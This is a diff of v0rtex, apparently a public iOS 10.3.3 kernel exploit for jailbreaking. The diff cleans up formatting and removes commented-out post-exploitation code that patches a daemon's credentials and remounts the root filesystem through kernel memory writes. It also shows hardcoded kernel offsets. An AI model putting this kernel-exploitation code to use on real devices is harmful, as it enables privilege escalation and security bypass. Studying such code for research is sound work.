@@ -47,9 +47,6 @@
 #include "common.h"             // LOG, kptr_t
 #include "v0rtex.h"
 
-//#include "patchfinder64.h"
-
-
 // ********** ********** ********** find automatically, eventually ********** ********** **********
 
 #   define SIZEOF_TASK                                  0x550
@@ -65,7 +62,7 @@
 #   define OFFSET_VTAB_GET_EXTERNAL_TRAP_FOR_INDEX      0xb7 /* in pointer-sized units */
     typedef struct mach_header_64 mach_hdr_t;
 
-// iPod touch 6G (iPod7,1) 10.3.3
+    // iPod touch 6G (iPod7,1) 10.3.3
 //#   define OFFSET_ZONE_MAP                              0xfffffff007558478 /* "zone_init: kmem_suballoc failed" */
 //#   define OFFSET_KERNEL_MAP                            0xfffffff0075b4050
 //#   define OFFSET_KERNEL_TASK                           0xfffffff0075b4048
@@ -557,8 +554,6 @@ typedef union
 
 // ********** ********** ********** exploit ********** ********** **********
 
-
-//kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide)
 kern_return_t v0rtex(v0rtex_cb_t callback, void *cb_data)
 {
     kern_return_t retval = KERN_FAILURE,
@@ -1441,100 +1436,16 @@ do \
         goto out;
     }
 
-        if(callback)
+    if(callback)
+    {
+        ret = callback(kernel_task, kbase, cb_data);
+        if(ret != KERN_SUCCESS)
         {
-            ret = callback(kernel_task, kbase, cb_data);
-            if(ret != KERN_SUCCESS)
-            {
-                LOG("callback returned error: %s", mach_error_string(ret));
-                goto out;
-            }
+            LOG("callback returned error: %s", mach_error_string(ret));
+            goto out;
         }
+    }
 
-
-    
-//----------------------------------------------------------------------
-//
-//  Sticktron's Additions
-//
-//----------------------------------------------------------------------
-
-
-//    *tfp0 = kernel_task;
-//    *kslide = slide;
-    
-    
-//    int rv = init_kernel(kbase, NULL);
-//    assert(rv == 0);
-//
-//    uint64_t trust_chain = find_trustcache();
-//    uint64_t amficache = find_amficache();
-//
-//    term_kernel();
-    
-    
-    /* 1. fix containermanagerd */
-    
-//    extern uint64_t allproc;
-//
-//    pid_t pd;
-//    uint64_t c_cred = 0;
-//    uint64_t proc = kread_uint64(allproc);
-//    while (proc) {
-//        char comm[20];
-//        kread(proc + offsetof_p_comm, comm, 16);
-//        comm[17] = 0;
-//        if (strstr(comm, "containermanager")) {
-//            break;
-//        }
-//        proc = kread_uint64(proc);
-//    }
-//    if (proc) {
-//        printf("containermanagerd proc: 0x%llx\n", proc);
-//        c_cred = kread_uint64(proc + offsetof_p_ucred);
-//        kwrite_uint64(proc + offsetof_p_ucred, credpatch);
-//    }
-
-    // get path to bootstrap
-//    char path[4096];
-//    uint32_t size = sizeof(path);
-//    _NSGetExecutablePath(path, &size);
-//    char *pt = realpath(path, NULL);
-//    NSString *execpath = [[NSString stringWithUTF8String:pt] stringByDeletingLastPathComponent];
-//    LOG("execpath = %s", execpath);
-    
-//    NSString *bootstrap = [execpath stringByAppendingPathComponent:@"bootstrap.tar"];
-    
-    
-    /* 2. remount "/" */
-
-//    {
-//        struct utsname uts;
-//        uname(&uts);
-//
-//        vm_offset_t off = 0xd8;
-//        if (strstr(uts.version, "16.0.0")) {
-//            off = 0xd0;
-//        }
-//
-//        uint64_t _rootvnode = mp ? (constget(5) + kaslr_shift) : (find_gPhysBase() + 0x38);
-//        uint64_t rootfs_vnode = kread_uint64(_rootvnode);
-//        uint64_t v_mount = kread_uint64(rootfs_vnode + off);
-//        uint32_t v_flag = kread_uint32(v_mount + 0x71);
-//
-//        kwrite_uint32(v_mount + 0x71, v_flag & ~(1 << 6));
-//
-//        char *nmz = strdup("/dev/disk0s1s1");
-//        rv = mount("hfs", "/", MNT_UPDATE, (void *)&nmz);
-//        NSLog(@"remounting: %d", rv);
-//
-//        v_mount = kread_uint64(rootfs_vnode + off);
-//        kwrite_uint32(v_mount + 0x71, v_flag);
-//    }
-    
-    
-    
-    
     retval = KERN_SUCCESS;
 
 out:;
